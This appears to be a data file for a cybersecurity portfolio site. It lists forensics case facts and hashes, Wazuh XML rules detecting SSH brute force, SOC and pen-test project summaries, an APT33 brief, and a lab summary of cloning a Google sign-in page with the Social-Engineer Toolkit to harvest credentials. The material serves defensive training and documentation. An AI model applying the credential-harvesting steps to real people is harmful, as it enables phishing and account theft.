      { label: "Installed", value: "2016-06-21 08:17:45 UTC" },
    ],
    chain: [
      { step: "Installs BCWipe and CCleaner", technique: "T1070.004" },
      { step: "Installs TeamViewer", technique: "T1219" },
      { step: "Installs Zenmap/Nmap", technique: "T1046" },
      { step: "Skype and Dropbox for personal use" },
    ],
    iocs: [
      { type: "hash", value: "c70ee7615b5c27ab9fee91681da8f4e2", note: "NTUSER.DAT (MD5)" },
      { type: "hash", value: "190697abebc5496f9b4eb6adc66d2834", note: "SAM (MD5)" },
      { type: "hash", value: "5b6a904d2e37fe3de2ab98cdc3c46291", note: "SOFTWARE (MD5)" },
      { type: "hash", value: "e4571e43d4d4b62db9c4dc4f96ab629a", note: "SYSTEM (MD5)" },
    ],
  },
  "autopsy": {
    pages: 18,
    facts: [
      { label: "Tool", value: "Autopsy 4.23.0" },
      { label: "Source", value: "14.4 GB USB drive, added as a local disk" },
      { label: "Result", value: "40,884 deleted file-system entries" },
    ],
  },

  /* ── Projects ──────────────────────────────────────────────────────── */
  "3omda-custom-detection-rules": {
    pages: 28,
    facts: [
      { label: "Rules", value: "52 custom (110001–110083) + Suricata/VirusTotal integration" },
      { label: "Coverage", value: "Windows, Linux, network, web" },
      { label: "Mapping", value: "MITRE ATT&CK id on every rule; PCI DSS and GDPR tags" },
    ],
    detection: [
      {
        title: "Wazuh — SSH brute force (rule 110001)",
        lang: "xml",
        code: `<rule id="110001" level="10" frequency="8" timeframe="60">
  <if_matched_sid>5716</if_matched_sid>
  <same_source_ip />
  <description>[BRUTE FORCE] SSH: $(srcip) failed $(frequency) times in $(timeframe)s - Possible brute force attack.</description>
  <mitre><id>T1110.001</id></mitre>
  <group>authentication_failures,pci_dss_10.2.4,pci_dss_10.2.5,gdpr_IV_35.7.d,</group>
</rule>`,
      },
      {
        title: "Wazuh — brute force followed by success (rule 110005)",
        lang: "xml",
        code: `<rule id="110005" level="14">
  <if_matched_sid>110001</if_matched_sid>
  <same_source_ip />
  <description>[BRUTE FORCE SUCCESS] $(srcip) succeeded after multiple failures - Possible account compromise!</description>
  <mitre><id>T1110.001</id></mitre>
  <group>authentication_success,brute_force_success,</group>
</rule>`,
      },
    ],
  },
  "soc-env-depi-r3-project": {
    pages: 37,
    facts: [
      { label: "Programme", value: "Digital Egypt Pioneers Initiative, Round 3" },
      { label: "Built by", value: "Solo — designed, deployed, tested and documented end to end" },
      { label: "Stack", value: "Wazuh, Suricata, YARA, VirusTotal API" },
      { label: "Testing", value: "Atomic Red Team, manual testing, threat emulation" },
    ],
  },
  "penetration-testing-life-cycle": {
    pages: 21,
    team: "Team playbook by Karim Tarek Ali, Ahmed Sherif Ali, Ahmed Emad Eldeen, Abdelrahman Elsayed, Joseph George Naseem, Omar Amr Mohammed and Sara Yehia Helmy.",
  },
  "iti-network-project-report": {
    pages: 21,
    team: "Team RootedAF at ITI: Ahmed Sherif, Ahmed Emad Eldeen, Abdelrahman ElSayed Abdul-Aziz and Mohamed Bahaa.",
    facts: [
      { label: "Client", value: "TechSphere Solutions (fictional)" },
      { label: "Scope", value: "Sales, Engineering, server farm" },
      { label: "Features", value: "VLANs, inter-VLAN routing, OSPF, STP, EtherChannel, ACLs" },
    ],
  },
  "apt33-threat-intel-brief": {
    pages: 4,
    facts: [
      { label: "Audience", value: "SOC management, aviation company" },
      { label: "Actor", value: "APT33 — active since at least 2013" },
      { label: "Technique", value: "T1078.004 Cloud Accounts (with the Ruler tool)" },
      { label: "Mitigation", value: "M1018 User Account Management" },
      { label: "Detection", value: "DET0546" },
    ],
  },
  "set-credential-harvesting": {
    pages: 11,
    chain: [
      { step: "SET → Website Attack Vectors → Credential Harvester" },
      { step: "Google sign-in page cloned on 192.168.10.200:80", technique: "T1566.002" },
      { step: "Victim submits e-mail and password over HTTP POST" },
      { step: "Credentials printed in plain text; victim redirected to google.com" },
    ],
  },
};
